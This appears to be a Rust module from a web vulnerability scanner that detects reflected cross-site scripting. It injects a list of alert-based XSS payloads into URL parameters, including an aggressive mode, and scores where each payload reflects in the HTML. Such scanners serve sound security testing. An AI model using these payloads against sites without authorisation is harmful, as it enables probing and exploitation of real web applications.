use crate::http::HttpClient;
use crate::types::{Finding, Mode, Severity};
use anyhow::Result;
use url::Url;

/// XSS scanner — context-aware reflection analysis (no naive substring match).
/// Confirms the payload lands in an executable HTML context, not inside a
/// text node / comment / quoted attribute that cannot break out.
pub async fn scan(http: &HttpClient, target: &str, params: &[String], mode: Mode) -> Result<Vec<Finding>> {
    let mut out = Vec::new();
    let base = if target.contains('?') {
        target.to_string()
    } else {
        format!("{}/?x=1", target.trim_end_matches('/'))
    };

    let payloads = xss_payloads(mode);
    for p in params {
        for payload in &payloads {
            let u = inject_param(&base, p, payload);
            if let Ok((_st, h, body, _f)) = http.get(&u).await {
                let hl = h.to_lowercase();
                let is_html = hl.contains("text/html");
                if !is_html {
                    continue; // not an HTML sink -> skip (kills CDN/JSON FP)
                }
                let confidence = analyze_xss_context(body.as_str(), payload);
                if confidence >= 70 {
                    out.push(
                        Finding::new(Severity::High, "XSS", "Reflected XSS (context-confirmed)", target)
                            .with_param(p)
                            .with_payload(payload)
                            .with_evidence("payload reflected in executable HTML context (script/attribute/href)")
                            .with_confidence(confidence),
                    );
                } else if confidence > 0 {
                    out.push(
                        Finding::new(Severity::Low, "XSS", "Parameter reflected (manual XSS confirm needed)", target)
                            .with_param(p)
                            .with_payload(payload)
                            .with_evidence("reflects but context may be safe (text node / quoted attr)")
                            .with_confidence(confidence),
                    );
                }
            }
        }
    }
    Ok(out)
}

/// Returns confidence 0..100 based on where the payload reflected.
/// 90+ = clearly executable context. 30-60 = reflected but possibly safe.
fn analyze_xss_context(body: &str, payload: &str) -> u8 {
    if body.is_empty() {
        return 0;
    }
    // Server may reflect the payload percent-encoded; decode body before matching.
    let body_dec = decode_percent(body);
    let idx = match body.find(payload) {
        Some(i) => i,
        None => match body_dec.find(payload) {
            Some(i) => i,
            None => {
                let dec = decode_percent(payload);
                match body.find(&dec) {
                    Some(i) => i,
                    None => return 0,
                }
            }
        },
    };
    score_at(body, idx, payload)
}

fn score_at(body: &str, idx: usize, _payload: &str) -> u8 {
    let before: String = body.chars().take(idx).collect();
    // Count unclosed tags before idx to know if we're inside a tag.
    let open_tags = before.matches('<').count();
    let close_tags = before.matches('>').count();
    let inside_tag = open_tags > close_tags;

    // Inside a tag? check if we're in an attribute value (quoted) or tag body.
    if inside_tag {
        // Find the nearest '<' and see if there's a quote context.
        let tag_start = before.rfind('<').unwrap_or(0);
        let tag_seg = &before[tag_start..];
        let in_attr_quote = tag_seg.contains('"') || tag_seg.contains('\'');
        if in_attr_quote {
            // Quoted attribute: payload can only break out with the quote char.
            // Our payloads contain no raw quote, so likely safe unless event handler.
            return 40;
        } else {
            // Tag body / unquoted attr -> attribute injection possible (e.g. onerror=)
            return 90;
        }
    }

    // Outside any tag: is it inside a <script> block?
    if let Some(script_pos) = before.rfind("<script") {
        if body[script_pos..].contains("</script>") {
            // script closed before our payload -> text node, safe
            return 20;
        } else {
            // inside <script> ... -> executable!
            return 95;
        }
    }

    // Inside <style> or comment? safe-ish
    if before.contains("<!--") && !before.contains("-->") {
        return 10;
    }

    // Default text node reflection (e.g. inside <p>text</p>) -> needs breaking out,
    // but many frameworks escape. Low confidence.
    return 30;
}

fn decode_percent(s: &str) -> String {
    let mut out = String::new();
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let Ok(h) = u8::from_str_radix(&s[i + 1..i + 3], 16) {
                out.push(h as char);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i] as char);
        i += 1;
    }
    out
}

fn xss_payloads(mode: Mode) -> Vec<String> {
    let mut v = vec![
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
    ];
    if mode != Mode::Stealth {
        v.extend(vec![
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<math><malignmark></math><img src=x onerror=alert(1)>",
        ]);
    }
    if mode == Mode::Crazy {
        v.extend(vec![
            "<script>alert(String.fromCharCode(88))</script>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "<script>alert`1`</script>",
            "<img src=x onerror=alert&#40;1&#41;>",
            "<svg><script>alert(1)</script></svg>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
        ]);
    }
    v.into_iter().take(mode.payload_intensity()).map(String::from).collect()
}

/// Inject `val` into query param `key`, preserving existing query.
fn inject_param(base: &str, key: &str, val: &str) -> String {
    if let Ok(mut u) = Url::parse(base) {
        u.query_pairs_mut().append_pair(key, val);
        u.to_string()
    } else {
        format!("{}?{}={}", base, key, val) // fallback (won't usually hit)
    }
}
